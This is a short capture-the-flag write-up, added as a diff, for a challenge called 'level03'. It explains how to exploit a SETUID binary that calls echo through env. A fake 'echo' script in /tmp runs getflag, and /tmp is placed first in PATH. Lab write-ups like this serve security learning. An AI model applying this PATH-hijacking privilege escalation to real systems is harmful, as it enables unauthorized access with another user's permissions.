@@ -1,0 +1,18 @@
+1. `scp -P 4242 level03@IP_OF_VM:/path/to/fileVM /path/targetHOST` to transfer executable 'level03' from VM to HOST
+
+2. Read a decompiled version with DecompileExplorer --> dewolf = best
+
+3. Line: system(usr/bin/env echo "Exploit me") tells us the executable uses ENV and we should exploit that
+
+4. Bonus info: executable is owned by flag03 and has SETUID (-rwsr-sr-x 1 flag03 level03 8627 level03) == it is executed with flag03's permissions
+
+5. Create a fake 'echo' in /tmp:
+#!/bin/sh
+
+getflag
+
+6. make /tmp/echo executable with `chmod +x /tmp/echo`
+
+7. modify PATH to include /tmp at the beginning: PATH=/tmp:$PATH
+
+8. Execute ./level03, it will use our fake echo to getflag with flag03's permissions --> no need to log into flag03
